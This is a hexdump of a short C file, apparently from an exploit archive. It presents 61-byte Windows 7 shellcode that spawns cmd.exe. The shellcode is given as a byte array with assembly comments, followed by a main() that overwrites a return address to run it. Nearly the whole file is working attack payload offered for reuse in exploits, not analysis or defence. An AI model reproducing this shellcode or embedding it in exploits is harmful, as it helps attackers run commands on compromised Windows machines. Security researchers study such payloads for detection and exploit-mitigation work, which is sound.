00000000  2f 2a 0a 20 7c 20 54 69  74 6c 65 3a 20 57 69 6e  |/*. | Title: Win|
00000010  64 6f 77 73 20 53 65 76  65 6e 20 78 36 34 20 28  |dows Seven x64 (|
00000020  63 6d 64 29 20 53 68 65  6c 6c 63 6f 64 65 20 36  |cmd) Shellcode 6|
00000030  31 20 42 79 74 65 73 0a  20 7c 20 54 79 70 65 3a  |1 Bytes. | Type:|
00000040  20 53 68 65 6c 6c 63 6f  64 65 0a 20 7c 20 41 75  | Shellcode. | Au|
00000050  74 68 6f 72 3a 20 61 67  69 78 0a 20 7c 20 50 6c  |thor: agix. | Pl|
00000060  61 74 66 6f 72 6d 3a 20  77 69 6e 33 32 0a 20 7c  |atform: win32. ||
00000070  20 49 6e 66 6f 3a 20 54  65 73 74 65 64 20 6f 6e  | Info: Tested on|
00000080  20 57 69 6e 64 6f 77 73  20 53 65 76 65 6e 20 50  | Windows Seven P|
00000090  72 6f 20 46 72 2c 20 55  6c 74 69 6d 61 74 65 20  |ro Fr, Ultimate |
000000a0  45 6e 2c 20 50 72 65 6d  69 75 6d 20 48 6f 6d 65  |En, Premium Home|
000000b0  20 45 6e 0a 2a 2f 0a 0a  23 69 6e 63 6c 75 64 65  | En.*/..#include|
000000c0  20 3c 73 74 64 69 6f 2e  68 3e 0a 0a 63 68 61 72  | <stdio.h>..char|
000000d0  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 20 3d 0a 0a  | shellcode[] =..|
000000e0  22 5c 78 33 31 5c 78 43  39 22 20 20 20 20 20 20  |"\x31\xC9"      |
000000f0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 78  |             //x|
00000100  6f 72 20 65 63 78 2c 65  63 78 0a 22 5c 78 36 34  |or ecx,ecx."\x64|
00000110  5c 78 38 42 5c 78 37 31  5c 78 33 30 22 20 20 20  |\x8B\x71\x30"   |
00000120  20 20 20 20 20 20 20 20  2f 2f 6d 6f 76 20 65 73  |        //mov es|
00000130  69 2c 5b 66 73 3a 65 63  78 2b 30 78 33 30 5d 0a  |i,[fs:ecx+0x30].|
00000140  22 5c 78 38 42 5c 78 37  36 5c 78 30 43 22 20 20  |"\x8B\x76\x0C"  |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 6d  |             //m|
00000160  6f 76 20 65 73 69 2c 5b  65 73 69 2b 30 78 63 5d  |ov esi,[esi+0xc]|
00000170  0a 22 5c 78 38 42 5c 78  37 36 5c 78 31 43 22 20  |."\x8B\x76\x1C" |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000190  6d 6f 76 20 65 73 69 2c  5b 65 73 69 2b 30 78 31  |mov esi,[esi+0x1|
000001a0  63 5d 0a 22 5c 78 38 42  5c 78 33 36 22 20 20 20  |c]."\x8B\x36"   |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001c0  2f 2f 6d 6f 76 20 65 73  69 2c 5b 65 73 69 5d 0a  |//mov esi,[esi].|
000001d0  22 5c 78 38 42 5c 78 30  36 22 20 20 20 20 20 20  |"\x8B\x06"      |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 6d  |             //m|
000001f0  6f 76 20 65 61 78 2c 5b  65 73 69 5d 0a 22 5c 78  |ov eax,[esi]."\x|
00000200  38 42 5c 78 36 38 5c 78  30 38 22 20 20 20 20 20  |8B\x68\x08"     |
00000210  20 20 20 20 20 20 20 20  20 20 2f 2f 6d 6f 76 20  |          //mov |
00000220  65 62 70 2c 5b 65 61 78  2b 30 78 38 5d 0a 22 5c  |ebp,[eax+0x8]."\|
00000230  78 45 42 5c 78 32 30 22  20 20 20 20 20 20 20 20  |xEB\x20"        |
00000240  20 20 20 20 20 20 20 20  20 20 20 2f 2f 6a 6d 70  |           //jmp|
00000250  20 73 68 6f 72 74 20 30  78 33 35 0a 22 5c 78 35  | short 0x35."\x5|
00000260  42 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |B"              |
00000270  20 20 20 20 20 20 20 20  20 2f 2f 70 6f 70 20 65  |         //pop e|
00000280  62 78 0a 22 5c 78 35 33  22 20 20 20 20 20 20 20  |bx."\x53"       |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002a0  2f 2f 70 75 73 68 20 65  62 78 0a 22 5c 78 35 35  |//push ebx."\x55|
000002b0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000002c0  20 20 20 20 20 20 20 20  2f 2f 70 75 73 68 20 65  |        //push e|
000002d0  62 70 0a 22 5c 78 35 42  22 20 20 20 20 20 20 20  |bp."\x5B"       |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002f0  2f 2f 70 6f 70 20 65 62  78 0a 22 5c 78 38 31 5c  |//pop ebx."\x81\|
00000300  78 45 42 5c 78 31 31 5c  78 31 31 5c 78 31 31 5c  |xEB\x11\x11\x11\|
00000310  78 31 31 22 20 20 20 2f  2f 73 75 62 20 65 62 78  |x11"   //sub ebx|
00000320  2c 30 78 31 31 31 31 31  31 31 31 0a 22 5c 78 38  |,0x11111111."\x8|
00000330  31 5c 78 43 33 5c 78 44  41 5c 78 33 46 5c 78 31  |1\xC3\xDA\x3F\x1|
00000340  41 5c 78 31 31 22 20 20  20 2f 2f 61 64 64 20 65  |A\x11"   //add e|
00000350  62 78 2c 30 78 31 31 31  61 33 66 64 61 20 28 66  |bx,0x111a3fda (f|
00000360  6f 72 20 73 65 76 65 6e  20 58 38 36 20 61 64 64  |or seven X86 add|
00000370  20 65 62 78 2c 30 78 31  31 31 39 66 37 61 36 29  | ebx,0x1119f7a6)|
00000380  0a 22 5c 78 46 46 5c 78  44 33 22 20 20 20 20 20  |."\xFF\xD3"     |
00000390  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000003a0  63 61 6c 6c 20 65 62 78  0a 22 5c 78 38 31 5c 78  |call ebx."\x81\x|
000003b0  43 33 5c 78 31 31 5c 78  31 31 5c 78 31 31 5c 78  |C3\x11\x11\x11\x|
000003c0  31 31 22 20 20 20 2f 2f  61 64 64 20 65 62 78 2c  |11"   //add ebx,|
000003d0  30 78 31 31 31 31 31 31  31 31 0a 22 5c 78 38 31  |0x11111111."\x81|
000003e0  5c 78 45 42 5c 78 38 43  5c 78 43 43 5c 78 31 38  |\xEB\x8C\xCC\x18|
000003f0  5c 78 31 31 22 20 20 20  2f 2f 73 75 62 20 65 62  |\x11"   //sub eb|
00000400  78 2c 30 78 31 31 31 38  63 63 38 63 20 28 66 6f  |x,0x1118cc8c (fo|
00000410  72 20 73 65 76 65 6e 20  58 38 36 20 73 75 62 20  |r seven X86 sub |
00000420  65 62 78 2c 30 78 31 31  31 34 63 63 64 37 29 0a  |ebx,0x1114ccd7).|
00000430  22 5c 78 46 46 5c 78 44  33 22 20 20 20 20 20 20  |"\xFF\xD3"      |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 63  |             //c|
00000450  61 6c 6c 20 65 62 78 0a  22 5c 78 45 38 5c 78 44  |all ebx."\xE8\xD|
00000460  42 5c 78 46 46 5c 78 46  46 5c 78 46 46 22 20 20  |B\xFF\xFF\xFF"  |
00000470  20 20 20 20 20 2f 2f 63  61 6c 6c 20 64 77 6f 72  |     //call dwor|
00000480  64 20 30 78 31 35 0a 2f  2f 64 62 20 22 63 6d 64  |d 0x15.//db "cmd|
00000490  22 0a 22 5c 78 36 33 5c  78 36 64 5c 78 36 34 22  |"."\x63\x6d\x64"|
000004a0  3b 0a 0a 0a 69 6e 74 20  6d 61 69 6e 28 69 6e 74  |;...int main(int|
000004b0  20 61 72 67 63 2c 20 63  68 61 72 20 2a 2a 61 72  | argc, char **ar|
000004c0  67 76 29 20 7b 0a 20 20  20 20 20 20 20 20 69 6e  |gv) {.        in|
000004d0  74 20 2a 72 65 74 3b 0a  20 20 20 20 20 20 20 20  |t *ret;.        |
000004e0  72 65 74 20 3d 20 28 69  6e 74 20 2a 29 26 72 65  |ret = (int *)&re|
000004f0  74 20 2b 20 32 3b 0a 20  20 20 20 20 20 20 20 28  |t + 2;.        (|
00000500  2a 72 65 74 29 20 3d 20  28 69 6e 74 29 20 73 68  |*ret) = (int) sh|
00000510  65 6c 6c 63 6f 64 65 3b  0a 7d                    |ellcode;.}|
0000051a
